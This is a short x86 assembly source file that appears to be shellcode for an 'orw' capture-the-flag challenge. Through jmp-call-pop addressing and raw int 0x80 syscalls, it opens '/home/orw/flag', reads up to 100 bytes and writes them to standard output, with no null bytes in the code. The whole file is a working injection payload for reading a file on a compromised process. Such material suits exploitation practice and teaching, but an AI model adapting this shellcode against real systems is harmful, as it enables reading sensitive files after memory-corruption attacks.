.section .text
.globl _start
_start:
	jmp	after_swag
swag:
	pop	%esi

	# open
	xor	%eax, %eax
	xor	%ecx, %ecx
	lea	(%esi), %ebx
	movb	$5, %al
	int	$0x80

	# read
	xor	%ebx, %ebx
	mov	%eax, %ebx
	xor	%ecx, %ecx
	xor	%eax, %eax
	lea	(%esp), %ecx
	movb	$100, %dl
	movb	$3, %al
	int	$0x80

	# write
	xor	%ebx, %ebx
	xor	%edx, %edx
	mov	%eax, %edx
	xor	%eax, %eax
	inc	%ebx
	addb	$4, %al
	int	$0x80

	# exit
	xor	%eax, %eax
	xor	%ebx, %ebx
	inc	%eax
	int	$0x80
after_swag:
	call	swag
	.string	"/home/orw/flag"
